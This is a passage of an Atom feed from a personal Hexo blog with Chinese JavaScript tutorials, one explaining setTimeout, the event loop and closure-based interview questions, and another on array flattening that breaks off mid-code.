<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>jiuylq</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://jiuylq.github.io/"/>
  <updated>2019-04-07T05:23:49.305Z</updated>
  <id>https://jiuylq.github.io/</id>
  
  <author>
    <name>jiuy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>setTimeout你应该知道的秘密</title>
    <link href="https://jiuylq.github.io/2019/03/13/setTimeout/"/>
    <id>https://jiuylq.github.io/2019/03/13/setTimeout/</id>
    <published>2019-03-13T08:31:09.000Z</published>
    <updated>2019-04-07T05:23:49.305Z</updated>
    
    <content type="html"><![CDATA[<p>计时器<code>setTimeout</code>是我们经常会用到的，它用于在指定的毫秒数后调用函数或计算表达式。<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="setTimeout你应该知道的秘密"><a href="#setTimeout你应该知道的秘密" class="headerlink" title="setTimeout你应该知道的秘密"></a>setTimeout你应该知道的秘密</h2><p>计时器<code>setTimeout</code>是我们经常会用到的，它用于在指定的毫秒数后调用函数或计算表达式。</p><p>语法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(code, millisec, args)</span><br></pre></td></tr></table></figure></p><p>注意：如果code为字符串，相当于执行<code>eval()</code>方法来执行code。著作权归作者所有。</p><h3 id="setTimeout原理"><a href="#setTimeout原理" class="headerlink" title="setTimeout原理"></a>setTimeout原理</h3><p>先来看一段代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> start = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="keyword">var</span> end = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">Date</span>() - start);</span><br><span class="line">&#125;,  <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">new</span> <span class="built_in">Date</span>() - start &lt;= <span class="number">1000</span>) &#123;&#125;</span><br></pre></td></tr></table></figure></p><p>在上面的代码中，定义了一个<code>setTimeout</code>定时器，延时时间是500毫秒。你是不是觉得打印结果是： 500</p><p>可事实却是出乎你的意料，打印结果是这样的（也许你打印出来会不一样，但肯定会大于1000毫秒）：<br>这是为毛呢？</p><p>究其原因，这是因为 JavaScript是单线程执行的。也就是说，在任何时间点，有且只有一个线程在运行JavaScript程序，无法同一时候运行多段代码。</p><p>再来看看浏览器下的JavaScript。</p><p>浏览器的内核是多线程的，它们在内核控制下相互配合以保持同步，一个浏览器至少实现三个常驻线程：<code>JavaScript引擎线程</code>，<code>GUI渲染线程</code>，<code>浏览器事件触发线程</code>。  </p><ul><li><code>JavaScript引擎</code>是基于事件驱动单线程执行的，JavaScript引擎一直等待着任务队列中任务的到来，然后加以处理，浏览器无论什么时候都只有一个JavaScript线程在运行JavaScript程序。</li><li><code>GUI渲染线程</code>负责渲染浏览器界面，当界面需要重绘（Repaint）或由于某种操作引发回流(Reflow)时，该线程就会执行。但需要注意，GUI渲染线程与JavaScript引擎是互斥的，当JavaScript引擎执行时GUI线程会被挂起，GUI更新会被保存在一个队列中等到JavaScript引擎空闲时立即被执行。</li><li><code>事件触发线程</code>，当一个事件被触发时，该线程会把事件添加到待处理队列的队尾，等待JavaScript引擎的处理。这些事件可来自JavaScript引擎当前执行的代码块如setTimeout、也可来自浏览器内核的其他线程如鼠标点击、Ajax异步请求等，但由于JavaScript的单线程关系，所有这些事件都得排队等待JavaScript引擎处理（当线程中没有执行任何同步代码的前提下才会执行异步代码）。</li></ul><p>到这里，我们再来回顾一下最初的例子：</p><p>虽然setTimeout的延时时间是500毫秒，可是由于while循环的存在，只有当间隔时间大于1000毫秒时，才会跳出while循环，也就是说，在1000毫秒之前，while循环都在占据着JavaScript线程。也就是说，只有等待跳出while后，线程才会空闲下来，才会去执行之前定义的setTimeout。</p><p>最后 ，我们可以总结出，setTimeout只能保证在指定的时间后将任务(需要执行的函数)插入任务队列中等候，但是不保证这个任务在什么时候执行。一旦执行javascript的线程空闲出来，自行从队列中取出任务然后执行它。</p><p>因为javascript线程并没有因为什么耗时操作而阻塞，所以可以很快地取出排队队列中的任务然后执行它，也是这种队列机制，给我们制造一个异步执行的假象。  </p><h3 id="setTimeout的好搭档“0”"><a href="#setTimeout的好搭档“0”" class="headerlink" title="setTimeout的好搭档“0”"></a>setTimeout的好搭档“0”</h3><p>下面有一段代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// statement</span></span><br><span class="line">&#125;, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><p>上面的代码表示立即执行。  </p><p>本意是立刻执行调用函数，但事实上，上面的代码并不是立即执行的，这是因为<code>setTimeout</code>有一个最小执行时间，当指定的时间小于该时间时，浏览器会用最小允许的时间作为setTimeout的时间间隔，也就是说即使我们把<code>setTimeout</code>的延迟时间设置为0，被调用的程序也没有马上启动。</p><p>不同的浏览器实际情况不同，IE8和更早的IE的时间精确度是15.6ms。不过，随着HTML5的出现，在高级版本的浏览器（Chrome、ie9+等），定义的最小时间间隔是不得低于4毫秒，如果低于这个值，就会自动增加，并且在2010年及之后发布的浏览器中采取一致。</p><p>所以说，当我们写为 <code>setTimeout(fn,0)</code> 的时候，实际是实现插队操作，要求浏览器“尽可能快”的进行回调，但是实际能多快就完全取决于浏览器了。</p><p>那<code>setTimeout(fn, 0)</code>有什么用处呢？其实用处就在于我们可以改变任务的执行顺序！因为浏览器会在执行完当前任务队列中的任务，再执行<code>setTimeout</code>队列中积累的的任务。</p><p>通过设置任务在延迟到0s后执行，就能改变任务执行的先后顺序，延迟该任务发生，使之异步执行。</p><p>来看一个网上很流行的例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">'#one input'</span>).onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.querySelector(<span class="string">'#one span'</span>).innerHTML = <span class="keyword">this</span>.value;</span><br><span class="line">&#125;;   </span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">'#second input'</span>).onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.querySelector(<span class="string">'#second span'</span>).innerHTML = <span class="built_in">document</span>.querySelector(<span class="string">'#second input'</span>).value;   &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当你往两个表单输入内容时，你会发现未使用setTimeout函数的只会获取到输入前的内容，而使用setTimeout函数的则会获取到输入的内容。</p><p>这是为什么呢？</p><p>因为当按下按键的时候，JavaScript 引擎需要执行 <code>keydown</code> 的事件处理程序，然后更新文本框的 value 值，这两个任务也需要按顺序来，事件处理程序执行时，更新 value值（是在<code>keypress</code>后）的任务则进入队列等待，所以我们在 <code>keydown</code> 的事件处理程序里是无法得到更新后的value的，而利用 <code>setTimeout(fn, 0)</code>，我们把取 value 的操作放入队列，放在更新 value 值以后，这样便可获取出文本框的值。</p><p>未使用setTimeout函数，执行顺序是：<code>onkeydown</code> =&gt; <code>onkeypress</code> =&gt; <code>onkeyup</code></p><p>使用setTimeout函数，执行顺序是：<code>onkeydown</code> =&gt; <code>onkeypress</code> =&gt; <code>function</code> =&gt; <code>onkeyup</code></p><p>虽然我们可以使用<code>keyup</code>来替代<code>keydown</code>，不过有一些问题，那就是长按时，<code>keyup</code>并不会触发。</p><p>长按时，keydown、keypress、keyup的调用顺序：<code>keydown</code> =&gt; <code>keypress</code> =&gt; <code>keydown</code> =&gt; <code>keypress</code> =&gt; <code>...</code> =&gt; <code>keyup</code></p><p>也就是说<code>keyup</code>只会触发一次，所以你无法用<code>keyup</code>来实时获取值。</p><p>我们还可以用<code>setImmediate()</code>来替代<code>setTimeout(fn,0)</code>：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">window</span>.setImmediate) &#123;   </span><br><span class="line">  <span class="built_in">window</span>.setImmediate = <span class="function"><span class="keyword">function</span>(<span class="params">func, args</span>)</span>&#123;   </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">window</span>.setTimeout(func, <span class="number">0</span>, args);   </span><br><span class="line">  &#125;;   </span><br><span class="line">  <span class="built_in">window</span>.clearImmediate = <span class="built_in">window</span>.clearTimeout;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>setImmediate()</code>方法用来把一些需要长时间运行的操作放在一个回调函数里，在浏览器完成后面的其他语句后，就立刻执行这个回调函数，必选的第一个参数<code>func</code>，表示将要执行的回调函数，它并不需要时间参数。</p><p>注意：目前只有IE10支持此方法，当然，在Nodejs中也可以调用此方法。</p><h3 id="setTimeout的一些秘密"><a href="#setTimeout的一些秘密" class="headerlink" title="setTimeout的一些秘密"></a>setTimeout的一些秘密</h3><p>1、setTimeout中回调函数的this</p><p>由于<code>setTimeout()</code> 方法是浏览器 window 对象提供的，因此第一个参数函数中的this其实是指向window对象，这跟变量的作用域有关。</p><p>看个例子：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="number">2</span>,</span><br><span class="line">  test: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;   </span><br><span class="line">obj.test();  <span class="comment">//  1</span></span><br></pre></td></tr></table></figure></p><p>不过我们可以通过使用bind()方法来改变setTimeout回调函数里的this</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="number">2</span>,</span><br><span class="line">  test: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">    &#125;.bind(<span class="keyword">this</span>), <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.test();  <span class="comment">//  2</span></span><br></pre></td></tr></table></figure><p>相关文章：<a href="http://ghmagical.com/article/page/id/UPLfoGI9vJ91" target="_blank" rel="noopener">JS中的call、apply、bind方法</a></p><p>2、setTimeout不止两个参数</p><p>我们都知道，<code>setTimeout</code>的第一个参数是要执行的回调函数，第二个参数是延迟时间（如果省略，会由浏览器自动设置。在IE，FireFox中，第一次配可能给个很大的数字，100ms上下，往后会缩小到最小时间间隔，Safari，chrome，opera则多为10ms上下。）</p><p>其实，<code>setTimeout</code>可以传入第三个参数、第四个参数….，它们表示神马呢？其实是用来表示第一个参数（回调函数）传入的参数。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>)</span>&#123;   </span><br><span class="line">  <span class="built_in">console</span>.log(a);   <span class="comment">// 3</span></span><br><span class="line">  <span class="built_in">console</span>.log(b);   <span class="comment">// 4</span></span><br><span class="line">&#125;,<span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure></p><h3 id="setTimeout常规面试题"><a href="#setTimeout常规面试题" class="headerlink" title="setTimeout常规面试题"></a>setTimeout常规面试题</h3><blockquote><p>重点考察setTimeout的执行顺序和闭包(JavaScript执行机制，Eventloop)</p></blockquote><p>1、问：以下函数的输出结果什么,为什么？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;, <span class="number">10</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure><p>答案：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="comment">// 4</span></span><br></pre></td></tr></table></figure></p><p>相信了解过<code>setTimeout</code>的人都知道<code>setTimeout</code>执行的是一个异步代码，只有在当主线程空闲的时候才会执行异步代码，for循环进入主线程执行，<code>settimeout</code>事件进入任务队列等待主线程空闲才会执行，所以打印出来的<code>i</code>是循环结束后的结果，都为<code>4</code></p><p>2、问：以下函数的输出结果什么？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;, <span class="number">0</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure><p>答案同上一题,（延申：如何让setTimeout打印的结果为<code>0，1，2，3</code>呢，思路利用闭包）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="keyword">var</span> fn1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">      setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i)</span><br><span class="line">      &#125;, <span class="number">0</span>)</span><br><span class="line">    &#125;)(i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn1()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="keyword">var</span> fn2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;, <span class="number">0</span>, i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn2()</span><br></pre></td></tr></table></figure><p>3、继续问：以下函数的输出结果什么？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i)</span><br><span class="line">      <span class="comment">// console.log(t)</span></span><br><span class="line">      clearTimeout(t)</span><br><span class="line">    &#125;, <span class="number">10</span>, i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure><p>答案：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure></p><p>为什么：这个<code>t</code>是定义在闭包外面的，也就是说<code>t</code>并没有被闭包保存，所以这里的<code>t</code>指的是最后一个循环留下来的<code>t</code>，所以最后一个<code>3</code>被清除了，没有输出。</p><p>4、还是问：以下函数输出的结果为？为什么？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> t = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params">i, t</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i)</span><br><span class="line">    <span class="built_in">console</span>.log(t)</span><br><span class="line">    clearTimeout(t)</span><br><span class="line">  &#125;, <span class="number">10</span>, i, t)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// t</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// t</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// t</span></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure></p><p>为什么：<code>t</code>被引用到闭包里面保持起来了，每次清除的是上一次的<code>setTimeout</code>，因为初始的<code>t</code>被定义了但没值，所以为<code>undefined</code></p><p>下面一题有待研究：按理说答案应该同上的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params">i, t</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i)</span><br><span class="line">      <span class="built_in">console</span>.log(t)</span><br><span class="line">      clearTimeout(t)</span><br><span class="line">    &#125;, <span class="number">10</span>, i, t)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br><span class="line"></span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// t</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// t</span></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure></p><p>5、继续问：以下函数输出的结果为？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> t = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params">i,t</span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i)</span><br><span class="line">      clearInterval(t)</span><br><span class="line">    &#125;,<span class="number">10</span>,i,t);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure><p>答案：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0,1,2,3,3,3,3,3...</span></span><br></pre></td></tr></table></figure></p><p>参考：<br><a href="http://ghmagical.com/article/page/id/H61NOVU0RZ9Y" target="_blank" rel="noopener">你应该知道的setTimeout秘密</a><br><a href="https://www.cnblogs.com/c3gen/p/6170504.html" target="_blank" rel="noopener">js同步和异步</a><br><a href="https://jayzangwill.github.io/blog/2017/03/01/Some%20of%20the%20interview%20questions%20that%20impressed%20me-1/" target="_blank" rel="noopener">几个让我印象深刻的面试题(一)</a></p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;计时器&lt;code&gt;setTimeout&lt;/code&gt;是我们经常会用到的，它用于在指定的毫秒数后调用函数或计算表达式。&lt;br&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="https://jiuylq.github.io/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>数组扁平化</title>
    <link href="https://jiuylq.github.io/2019/03/10/delayering/"/>
    <id>https://jiuylq.github.io/2019/03/10/delayering/</id>
    <published>2019-03-09T16:00:00.000Z</published>
    <updated>2019-04-07T05:23:25.353Z</updated>
    
    <content type="html"><![CDATA[<p>数组扁平化  将一个多维数组转换为一维数组；扁平化不改变原数据类型(即数组里的每个数据的类型)<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="数组扁平化"><a href="#数组扁平化" class="headerlink" title="数组扁平化"></a><font color="#00ffff">数组扁平化<font></font></font></h2><blockquote><p>数组扁平化  将一个多维数组转换为一维数组；扁平化不改变原数据类型(即数组里的每个数据的类型)</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"><span class="comment">//扁平化之后：[1,2,3,4,5,6,7,8];</span></span><br></pre></td></tr></table></figure><p>1、递归</p><p>*<em>循环数组元素，如果还是一个数组，就递归调用该方法</em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatten</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Array</span>.isArray(arr[i]))&#123;</span><br><span class="line">            result = result.concat(flatten(arr[i]))</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            result.push(arr[i]);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(flatten(arr))</span><br></pre></td></tr></table></figure><p>*<em>指定了depth作为扁平化的深度</em></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,[<span class="number">6</span>,<span class="number">7</span>]]],<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flattenDepth</span>(<span class="params">array, depth=<span class="number">1</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  array.forEach (<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> d = depth;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">Array</span>.isArray(item) &amp;&amp; d &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      result.push(...(flattenDepth(item, --d)))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.push(item);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 